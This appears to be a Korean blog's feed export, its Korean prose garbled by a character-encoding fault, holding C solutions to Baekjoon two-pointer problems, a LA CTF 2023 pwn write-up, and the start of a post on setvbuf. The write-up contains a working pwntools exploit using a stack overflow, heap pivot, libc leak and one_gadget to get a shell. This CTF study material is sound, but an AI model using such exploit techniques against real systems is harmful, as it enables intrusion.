class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> right = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right &amp;&amp; right &lt; n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; m) &#123;</span><br><span class="line">            sum -= arr[++left];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; m) &#123;</span><br><span class="line">            sum += arr[++right];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum == m) &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">            sum += arr[++right];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, cnt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>nê°œì˜ ì •ìˆ˜ë¡œ ì´ë£¨ì–´ì§„ ìˆ˜ì—´ì´ ìžˆì„ ë•Œ, ì—°ì†ëœ ê°’ì˜ í•©ì´ mì´ ë˜ëŠ” ê²½ìš°ì˜ ìˆ˜ë¥¼ êµ¬í•˜ëŠ” ë¬¸ì œì´ë‹¤. ì—°ì†ëœ ê°’ì„ ë”í•˜ëŠ” ê²ƒì´ í•µì‹¬ì´ê¸° ë•Œë¬¸ì´ê¸° ë•Œë¬¸ì— íˆ¬ í¬ì¸í„° ì•Œê³ ë¦¬ì¦˜ì„ ì´ìš©í•œë‹¤. leftì™€ right ë³€ìˆ˜ë¥¼ í•˜ë‚˜ì”© ë‘ê³  ì¡°ê±´ì— ë”°ë¼ ë‘˜ ì¤‘ í•˜ë‚˜ì˜ í¬ì¸í„°ë¥¼ ì´ë™ì‹œì¼œ ê·¸ ê°’ì„ ë”í•˜ê±°ë‚˜ ëº€ë‹¤. ì¤‘ìš”í•œ ê²ƒì€ leftëŠ” í•­ìƒ rightì˜ ì™¼ìª½ì— ìœ„ì¹˜í•˜ê³ , rightëŠ” ì •ìˆ˜ì˜ í¬ê¸° ì¦‰, në³´ë‹¤ ìž‘ì•„ì•¼ í•œë‹¤.</p><p>ì—°ì†ëœ ê°’ì´ mì´ ë˜ëŠ” ê²½ìš°ì˜ ìˆ˜ë¥¼ êµ¬í•˜ëŠ” ê²ƒì´ê¸° ë•Œë¬¸ì— ì¡°ê±´ì€ sumì´ më³´ë‹¤ í°ê°€, ìž‘ì€ê°€, ê°™ì€ê°€ë¡œ ë‚˜ëˆŒ ìˆ˜ ìžˆë‹¤. ë§Œì•½ sumì´ më³´ë‹¤ í¬ë‹¤ë©´ leftë¥¼ ì˜¤ë¥¸ìª½ìœ¼ë¡œ í•œ ì¹¸ ì´ë™ì‹œì¼œ leftê°€ ê°€ë¦¬í‚¤ëŠ” ê°’ì„ sumì—ì„œ ëº€ë‹¤. ë§Œì•½ sumì´ më³´ë‹¤ ìž‘ë‹¤ë©´ rightë¥¼ ì˜¤ë¥¸ìª½ìœ¼ë¡œ í•œ ì¹¸ ì´ë™ì‹œì¼œ rightê°€ ê°€ë¦¬í‚¤ëŠ” ê°’ì„ sumì— ë”í•œë‹¤. sumê³¼ mì´ ê°™ë‹¤ë©´ cntë¥¼ ì¦ê°€ì‹œì¼œì£¼ê³  rightë¥¼ ì˜¤ë¥¸ìª½ìœ¼ë¡œ í•œ ì¹¸ ì´ë™ì‹œí‚¤ê³  ë‹¤ë¥¸ ê²½ìš°ì˜ ìˆ˜ë¥¼ ì°¾ëŠ”ë‹¤.</p><h2 id="ë°±ì¤€-ìˆ˜ì—´-ì‹¤ë²„3"><a href="#ë°±ì¤€-ìˆ˜ì—´-ì‹¤ë²„3" class="headerlink" title="ë°±ì¤€ - ìˆ˜ì—´ (ì‹¤ë²„3)"></a>ë°±ì¤€ - ìˆ˜ì—´ (ì‹¤ë²„3)</h2><ul><li><a href="https://www.acmicpc.net/problem/2559">https://www.acmicpc.net/problem/2559</a></li><li>nê°œ ì •ìˆ˜ì˜ ìˆ˜ì—´ì´ ì£¼ì–´ì¡Œì„ ë•Œ, ì—°ì†ì ì¸ kê°œì˜ ê°’ì˜ í•©ì´ ê°€ìž¥ í° ê°’ì„ ê³„ì‚°<ul><li>ìž…ë ¥  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10 2</span><br><span class="line">3 -2 -4 -9 0 3 7 13 8 -3</span><br></pre></td></tr></table></figure></li><li>ì¶œë ¥  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21</span><br></pre></td></tr></table></figure></li></ul></li><li>C ì½”ë“œ<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,k;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        sum += arr[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    max = sum;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; n; i++) &#123;</span><br><span class="line">        sum += arr[i];</span><br><span class="line">        sum -= arr[i-k];</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; max) &#123;</span><br><span class="line">            max = sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>ì•žì˜ ë¬¸ì œì™€ ë‹¤ë¥´ê²Œ í•©ì´ mì´ ë˜ëŠ” ê²½ìš°ì˜ ìˆ˜ë¥¼ êµ¬í•˜ëŠ” ê²ƒì´ ì•„ë‹Œ, kê°œì˜ ì—°ì†ëœ ê°’ì˜ í•©ì´ ê°€ìž¥ í° ê°’ì„ ê³„ì‚°í•´ì•¼ í•œë‹¤. ì•žì˜ ë¬¸ì œëŠ” ì—°ì†ëœ ê°’ì´ ìˆ˜ë¥¼ ì˜ˆì¸¡í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— leftì™€ rightë¥¼ ë…ë¦½ì ìœ¼ë¡œ ê³„ì‚°í–ˆì§€ë§Œ ì´ ë¬¸ì œëŠ” ì—°ì†ëœ ê°’ì˜ ìˆ˜ë¥¼ ì•Œ ìˆ˜ ìžˆê¸° ë•Œë¬¸ì— êµ³ì´ ê·¸ëŸ¬ì§€ ì•Šì•„ë„ ëœë‹¤. iì™€ i-k ë²ˆì§¸ ì¸ë±ìŠ¤(íˆ¬ í¬ì¸í„° ì•Œê³ ë¦¬ì¦˜ì—ì„œ í¬ì¸í„°ì˜ ê°œë…)ë¡œ leftì™€ rightë¥¼ ëŒ€ì²´í•  ìˆ˜ ìžˆë‹¤.</p><p>ì²˜ìŒì— arr[0] ~ arr[k-1]ì˜ í•©ì„ êµ¬í•´ì£¼ê³  maxë¡œ ì €ìž¥í•œë‹¤. ì´ ê°’ì´ ê¸°ì¤€ì ì´ ë  ê²ƒì´ê³ , ì´ ê°’ë³´ë‹¤ í° ê²½ìš° ìƒˆë¡œìš´ ê°’ì„ maxë¡œ ì§€ì •í•  ê²ƒì´ë‹¤. arr[k]ì—ì„œ arr[n-1]ë¡œ ë°˜ë³µì´ ì§„í–‰ë  ë™ì•ˆ arr<a href="right">i</a>ë¥¼ sumì— ë”í•˜ê³  arr<a href="left">i-k</a>ë¥¼ sumì—ì„œ ë¹¼ì¤€ë‹¤. í•´ë‹¹ ë°˜ë³µì´ ëë‚˜ë©´ ë¬¸ì œì—ì„œ ìš”êµ¬í•˜ëŠ” maxë¥¼ êµ¬í•  ìˆ˜ ìžˆë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Baekjoon </tag>
            
            <tag> two-pointers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - stuff (setvbuf)</title>
      <link href="/230303-lactf2023-stuff/"/>
      <url>/230303-lactf2023-stuff/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>Jason keeps bullying me for using Fedora so hereâ€™s a binary compiled on Fedora.<br><code>nc lac.tf 31182</code></p></blockquote><ul><li>[7 solves &#x2F; 497 points]</li></ul><p>ìƒˆë¡œìš´ ê²ƒì„ ë§Žì´ ë°°ìš´ ë¬¸ì œì´ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë¶„ì„í•˜ê¸°ì— ì•žì„œ <code>patchelf</code>ë¥¼ ì´ìš©í•˜ì—¬ ì—´ì‹¬ížˆ íŒ¨ì¹˜ë¥¼ ì§„í–‰í–ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch stuff]$ ldd stuff-p</span><br><span class="line">linux-vdso.so.1 (0x00007ffdd2f16000)</span><br><span class="line">./libstdc++.so.6 (0x00007f32ef600000)</span><br><span class="line">./libm.so.6 (0x00007f32ef86a000)</span><br><span class="line">./libgcc_s.so.1 (0x00007f32ef84a000)</span><br><span class="line">./libc.so.6 (0x00007f32ef423000)</span><br><span class="line">./ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f32ef94c000)</span><br></pre></td></tr></table></figure><p>ì´ì œ IDAë¥¼ ì´ìš©í•´ì„œ ì½”ë“œë¥¼ ë¶„ì„í•´ë³´ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;menu:&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1. leak&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2. do stuff&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6) != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;oops&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;here&#x27;s your leak: %p\n&quot;</span>, v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">2</span> );</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x20</span>uLL, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë‘ ê°€ì§€ì˜ ê¸°ëŠ¥ì´ ìžˆë‹¤. heap ì£¼ì†Œë¥¼ ì¶œë ¥í•´ì£¼ëŠ” ê¸°ëŠ¥ê³¼ <code>fread</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ <code>char ptr[12]</code>ì— 0x20ë§Œí¼ ì“¸ ìˆ˜ ìžˆë‹¤. ì—¬ê¸°ì—ì„œ overflowë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìžˆê³  retë¥¼ ë®ì–´ ripë¥¼ ì¡°ì ˆí•  ìˆ˜ ìžˆë‹¤.</p><p>ì—¬ê¸°ì„œ ì¤‘ìš”í•œ ì ì€ <code>setvbuf</code>ë¥¼ ì´ìš©í•˜ì—¬ <code>stdin</code>ì„ ì‚¬ìš©í•  ë•Œ ë²„í¼ë§ì„ ì´ìš©í•˜ê¸° ë•Œë¬¸ì— íž™ì— ë‚´ê°€ ìž…ë ¥í•œ ê°’ë“¤ì´ ì €ìž¥ëœë‹¤. ì´ê²ƒì€ íž™ ì£¼ì†Œì— íŽ˜ì´ë¡œë“œë¥¼ ì €ìž¥ì‹œí‚¬ ìˆ˜ ìžˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤.</p><ul><li><a href="https://jiravvit.github.io/230223-pwn-setvbuf/">https://jiravvit.github.io/230223-pwn-setvbuf/</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>scanf</code>ë¡œ ìˆ«ìž ë°ì´í„°ë¥¼ í•˜ë‚˜ ë³´ë‚¼ ë•Œ, ë’¤ì— ë‹¤ë¥¸ ê°’ë“¤ì„ ë§ë¶™ì´ë©´ ì´ ë°ì´í„°ë“¤ì€ íž™ ë²„í¼ì— ì €ìž¥ë˜ê³ , ë‹¤ìŒ ìž…ë ¥ ë•Œ ì‚¬ìš©ìžì˜ í‚¤ë³´ë“œë¡œë¶€í„° ìž…ë ¥ì„ ë°›ì§€ ì•Šê³  ì´ íž™ ë²„í¼ì— ì €ìž¥ëœ ê°’ì„ ë°”ë¡œ ìž…ë ¥ìœ¼ë¡œ ë„£ì–´ì¤„ ìˆ˜ ìžˆë‹¤. </p><ol><li><p>ì£¼ì–´ì§„ ê¸°ëŠ¥ì„ ì´ìš©í•´ íž™ ì£¼ì†Œë¥¼ leakí•œë‹¤. </p></li><li><p>2ë²ˆ ê¸°ëŠ¥ì„ ì´ìš©í•˜ê¸° ìœ„í•´ 2ë¥¼ ì„œë²„ë¡œ ì „ì†¡í•˜ëŠ”ë°, ë’¤ì— ROP íŽ˜ì´ë¡œë“œë¥¼ ë§ë¶™ì—¬ì„œ í•œ ë²ˆì— ì „ì†¡í•œë‹¤. ì°¸ê³ ë¡œ ì´ ROP íŽ˜ì´ë¡œë“œëŠ” 2ë²ˆ ê¸°ëŠ¥ì˜ <code>fread</code> í•¨ìˆ˜ê°€ ì¢…ë£Œëœ ë’¤, mainì´ ëë‚˜ê³  <code>leave ret</code>ì„ í•œ ë²ˆ ë” ìˆ˜í–‰í•˜ì—¬ rbpì™€ rspë¥¼ heapì£¼ì†Œë¡œ ë§Œë“¤ì–´ì¤€ë‹¤. ê·¸ heap ì£¼ì†ŒëŠ” ROP íŽ˜ì´ë¡œë“œê°€ ì €ìž¥ëœ ê³³ì´ê³  <code>fread</code> ê°€ì ¯ì„ ë°°ì¹˜í•˜ì—¬ ë°”ë¡œ í•œ ë²ˆ ë” ì‹¤í–‰í•˜ê²Œ í•œë‹¤. ì´ ë•Œ, ë‘ ë²ˆì§¸ íŽ˜ì´ë¡œë“œë¥¼ ìž…ë ¥ìœ¼ë¡œ ë°›ëŠ”ë°, ì´ê²ƒì˜ ì—­í• ì€ <code>printf</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ë„ë¡ í•˜ëŠ” ê²ƒì´ë‹¤. <code>fread</code> í•¨ìˆ˜ê°€ ì¢…ë£Œë˜ê³  <code>printf();</code>ê°€ ì‹¤í–‰ë˜ëŠ”ë° NULL pointerë¥¼ ì¶œë ¥í•˜ê²Œ ë˜ë©´ ì•„ë¬´ê²ƒë„ ì¶œë ¥í•˜ì§€ ì•ŠëŠ”ë‹¤. ì¤‘ìš”í•œ ê²ƒì€ <code>printf</code> í•¨ìˆ˜ê°€ ì¢…ë£Œë˜ê³  <code>rsi</code>ì— <code>libc</code> ì£¼ì†Œê°€ ë“¤ì–´ê°€ëŠ” ê²ƒì´ë‹¤. ê·¸ ë‹¤ìŒ <code>0x4011f6</code> ì£¼ì†Œê°€ ì‹¤í–‰ë˜ëŠ”ë° ì´ëŠ” <code>rsi</code> ë ˆì§€ìŠ¤í„°ë¥¼ ì¶œë ¥í•˜ë¯€ë¡œ ìµœì¢…ì ìœ¼ë¡œ <code>libc</code> ì£¼ì†Œë¥¼ ì¶œë ¥í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011F6 mov     edi, offset format ; &quot;here&#x27;s your leak: %p\n&quot;</span><br><span class="line">.text:00000000004011FB mov     eax, 0</span><br><span class="line">.text:0000000000401200 call    _printf</span><br></pre></td></tr></table></figure><p>ì´ ìž‘ì—…ì´ ëë‚˜ë©´ mainì˜ <code>while(1)</code> ë£¨í”„ ë‚´ë¶€ì´ë¯€ë¡œ mainì˜ ê¸°ëŠ¥ì„ ì¶”ê°€ì ìœ¼ë¡œ ë” ì‹¤í–‰í•  ìˆ˜ ìžˆë‹¤.</p></li><li><p>í™”ë©´ì— leakëœ libc ì£¼ì†Œë¥¼ ê°€ì ¸ì™€ libc baseë¥¼ êµ¬í•œë‹¤.</p></li><li><p>ì›ê°€ì ¯ì„ ì´ìš©í•˜ì—¬ ì‰˜ì„ íšë“í•œë‹¤. 2ë²ˆ ë©”ë‰´ë¥¼ ì´ìš©í•˜ì—¬ ripë¥¼ ì¡°ìž‘í•  ìˆ˜ ìžˆë‹¤. ì¡°ê±´ì€ ì•„ëž˜ì™€ ê°™ìœ¼ë¯€ë¡œ ë ˆì§€ìŠ¤í„° ìƒí™©ì„ ì‚´íŽ´ë³´ê³  ì ë‹¹í•œ ê°€ì ¯ì„ ì°¾ì•„ ê°’ì„ ë°”ê¿”ì¤€ë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x4d1a0 posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ) </span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br></pre></td></tr></table></figure></li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stuff-p&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;lac.tf&#x27;, 31182)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./stuff-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x401234</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) leak the heap</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;stuff\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)</span></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.rjust(<span class="number">8</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment"># heap pivoting</span></span><br><span class="line"><span class="comment"># fread(ptr, 1uLL, 0x20uLL, stdin);</span></span><br><span class="line">payload += p64(heap)</span><br><span class="line">payload += p64(<span class="number">0x40120f</span>) <span class="comment"># fread gadget</span></span><br><span class="line">payload += p64(heap-<span class="number">0x1008</span>)</span><br><span class="line">payload += p64(leave_ret) <span class="comment"># 0x20</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;stuff\n&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># p.send(p64(heap-0x1008) * 2 + p64(e.plt[&#x27;printf&#x27;]) + p64(0x4011f6))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;BBBBBBBB&#x27;</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;printf&#x27;</span>]) <span class="comment"># fread -&gt; printf :: set rsi to libc</span></span><br><span class="line">payload += p64(<span class="number">0x4011f6</span>) <span class="comment"># print libc</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;leak: &#x27;</span>+ <span class="built_in">hex</span>(leak))</span><br><span class="line">libc.address = leak - <span class="number">0x1d5a40</span></span><br><span class="line">info(<span class="string">&#x27;libc.address: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (4)</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4d1a0</span></span><br><span class="line">pop_rbx = libc.address + <span class="number">0x0000000000031f61</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.rjust(<span class="number">8</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rbx) + p64(<span class="number">0</span>) + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;stuff\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> setvbuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - setvbuf</title>
      <link href="/230223-pwn-setvbuf/"/>
      <url>/230223-pwn-setvbuf/</url>
      
        <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>ì–¼ë§ˆ ì „ ë¬¸ì œë¥¼ í’€ë‹¤ê°€ ì²˜ìŒ ë³´ëŠ” ê°œë…ì´ ë‚˜ì™€ì„œ ì •ë¦¬í•´ë³´ë ¤ê³  í•œë‹¤. <code>scanf(&quot;%d&quot;, &amp;n)</code>ìœ¼ë¡œ intí˜• ê°’ì„ ìž…ë ¥ë°›ëŠ”ë° ì´ìƒí•˜ê²Œ ì˜¤ë²„í”Œë¡œìš°(?)ê°€ ë°œìƒí•˜ì§€ë„ ì•ŠëŠ”ë° ë°ì´í„°ê°€ heapì— ì €ìž¥ë˜ëŠ” ê²ƒì´ë‹¤. write upì„ ì‚´íŽ´ë´ë„ ìµìŠ¤ ì½”ë“œë§Œ ìžˆê³  heapì— paylaodë¥¼ pivotí•œë‹¤ëŠ” ì‹ë§Œ ì£¼ì„ìœ¼ë¡œ ê°„ë‹¨í•˜ê²Œ ì í˜€ìžˆì–´ì„œ ì™œ heapì— payloadê°€ ì €ìž¥ë˜ëŠ”ì§€ ì´í•´í•˜ê¸°ê°€ íž˜ë“¤ì—ˆë‹¤. ì´ì— ëŒ€í•´ ê°„ë‹¨í•˜ê²Œ ì•Œì•„ë³´ìž.</p><p>ê²°ë¡ ì„ ë§í•˜ë©´ <code>setvbuf</code> í•¨ìˆ˜ ë•Œë¬¸ì´ì—ˆë‹¤.</p><h2 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a><code>setvbuf</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">int setvbuf(FILE* stream, char* buffer, int mode, size_t size);</span><br></pre></td></tr></table></figure><p>ìŠ¤íŠ¸ë¦¼ ë²„í¼ ë°©ì‹ì„ ë³€ê²½í•œë‹¤. <code>ë²„í¼ë§</code>ì€ ì‹œìŠ¤í…œ ìžì›ì„ íš¨ìœ¨ì ìœ¼ë¡œ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ë°ì´í„°ë¥¼ ë²„í¼ë¼ëŠ” ê³µê°„ì— ë‹´ì•„ë‘ê³  ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤. ë²„í¼ë§ì„ í•˜ì§€ ì•Šìœ¼ë©´ 